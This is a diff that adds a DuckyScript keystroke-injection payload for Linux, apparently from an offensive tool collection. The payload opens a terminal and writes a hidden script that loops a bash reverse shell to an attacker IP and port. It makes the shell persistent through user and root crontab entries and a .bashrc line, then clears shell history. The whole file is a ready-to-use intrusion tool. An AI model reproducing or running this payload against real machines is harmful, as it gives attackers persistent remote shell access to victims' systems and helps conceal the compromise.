@@ -1,0 +1,72 @@
+REM ==========================================
+REM Title: Linux Crontab Persistence
+REM Author: NullSec Suite
+REM Target: Linux (Ubuntu/Debian/Kali)
+REM Description: Installs a persistent reverse
+REM   shell via crontab that reconnects every
+REM   5 minutes. Also plants a secondary
+REM   backdoor in system-wide cron directories.
+REM Category: Persistence / Execution
+REM ==========================================
+DELAY 1000
+REM Open terminal on Linux
+CTRL-ALT t
+DELAY 1000
+REM Set attacker variables (replace with actual C2)
+STRING ATTACKER_IP="10.0.0.1"
+ENTER
+DELAY 350
+STRING ATTACKER_PORT="4444"
+ENTER
+DELAY 350
+REM Create reverse shell script in hidden directory
+STRING mkdir -p ~/.config/.cache 2>/dev/null
+ENTER
+DELAY 350
+STRING cat > ~/.config/.cache/.updater.sh << 'CRONEOF'
+ENTER
+DELAY 300
+STRING #!/bin/bash
+ENTER
+DELAY 300
+STRING while true; do
+ENTER
+DELAY 300
+STRING   bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1 2>/dev/null
+ENTER
+DELAY 300
+STRING   sleep 300
+ENTER
+DELAY 300
+STRING done
+ENTER
+DELAY 300
+STRING CRONEOF
+ENTER
+DELAY 350
+REM Make executable
+STRING chmod +x ~/.config/.cache/.updater.sh
+ENTER
+DELAY 350
+REM Install user crontab entry
+STRING (crontab -l 2>/dev/null; echo "*/5 * * * * ~/.config/.cache/.updater.sh >/dev/null 2>&1") | crontab -
+ENTER
+DELAY 400
+REM Attempt system-wide cron persistence (requires sudo)
+STRING echo "*/10 * * * * root ~/.config/.cache/.updater.sh >/dev/null 2>&1" | sudo tee /etc/cron.d/.system-update >/dev/null 2>&1
+ENTER
+DELAY 400
+REM Add to bashrc for login persistence
+STRING echo 'nohup ~/.config/.cache/.updater.sh &>/dev/null &' >> ~/.bashrc
+ENTER
+DELAY 400
+REM Verify crontab installation
+STRING crontab -l 2>/dev/null | tail -1
+ENTER
+DELAY 400
+REM Clear history and close
+STRING history -c && history -w
+ENTER
+DELAY 350
+STRING exit
+ENTER
